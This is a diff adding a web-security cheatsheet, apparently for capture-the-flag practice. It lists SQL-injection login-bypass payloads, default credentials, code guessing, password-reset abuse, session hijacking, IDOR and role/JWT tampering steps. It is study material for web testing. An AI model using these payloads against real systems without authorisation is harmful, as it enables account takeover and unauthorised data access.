@@ -1,0 +1,175 @@
+========================================
+AUTHENTICATION & ACCESS CHEATSHEET
+========================================
+
+[HOW TO IDENTIFY]
+- Login / Register functionality
+- Cookies / session tokens present
+- URLs with user IDs (/user/1)
+- Role-based access (admin/user)
+
+========================================
+🔓 AUTHENTICATION BYPASS
+========================================
+
+[Basic Payloads]
+admin' --
+admin' #
+' OR 1=1--
+' OR '1'='1
+
+[Empty / Weak Input]
+username=admin&password=
+username=admin&password=admin
+username=test&password=test
+
+[Remove Fields (Burp)]
+Send request without password field
+
+[Change Method]
+POST → GET
+
+========================================
+🔑 BROKEN AUTHENTICATION
+========================================
+
+[Bruteforce]
+Try common creds:
+admin:admin
+admin:password
+test:test
+
+[No Rate Limit]
+Send multiple login attempts fast
+
+[Password Reset Abuse]
+Change email parameter:
+email=victim@mail.com → your@mail.com
+
+[Bypass Verification]
+code=000000
+code=123456
+
+========================================
+🍪 SESSION FIXATION
+========================================
+
+[Steps]
+1. Get session ID before login
+2. Login with same session
+3. If unchanged → vulnerable
+
+[Manual Set]
+Cookie: session=abc123
+→ login → check if same
+
+========================================
+🍪 SESSION HIJACKING
+========================================
+
+[Check Cookies]
+DevTools → Application → Cookies
+
+[Reuse Session]
+Copy cookie:
+session=xyz
+
+Paste in another browser → access account
+
+[Look for]
+- No expiry
+- No IP binding
+
+========================================
+📂 IDOR (VERY IMPORTANT)
+========================================
+
+[URL Manipulation]
+/user/1 → /user/2
+/profile?id=1 → id=2
+
+[API]
+GET /api/user/1 → /api/user/2
+
+[POST Data]
+user_id=1 → 2
+
+[Hidden Fields]
+<input type="hidden" value="1">
+
+========================================
+⬆️ PRIVILEGE ESCALATION
+========================================
+
+[Parameter Change]
+role=user → admin
+is_admin=0 → 1
+access=basic → admin
+
+[Direct Access]
+/admin
+/admin/dashboard
+/admin/panel
+
+[JWT]
+Change:
+"isAdmin": false → true
+
+[Remove Restrictions]
+Delete role check in request
+
+========================================
+🧪 ACCESS CONTROL TEST FLOW
+========================================
+
+1. Login as normal user
+2. Capture request (Burp)
+3. Change:
+   - ID
+   - role
+   - user_id
+4. Send request
+5. Check response
+
+========================================
+🔍 COMMON ENTRY POINTS
+========================================
+
+- /login
+- /register
+- /profile
+- /dashboard
+- /api/user
+- /admin
+
+========================================
+🔥 QUICK PAYLOAD SET
+========================================
+
+admin' --
+' OR 1=1--
+username=admin&password=admin
+role=admin
+is_admin=1
+user_id=1 → 2 → 3
+session=xyz (reuse)
+
+========================================
+⚠️ COMMON MISTAKES
+========================================
+
+- Not changing IDs
+- Ignoring hidden fields
+- Not checking cookies
+- Forgetting /admin endpoints
+
+========================================
+RULES
+========================================
+
+- CHANGE EVERYTHING (ID, role, params)
+- THINK LIKE ATTACKER
+- SIMPLE BYPASS WORKS
+- IDOR = FREE FLAGS
+
+========================================
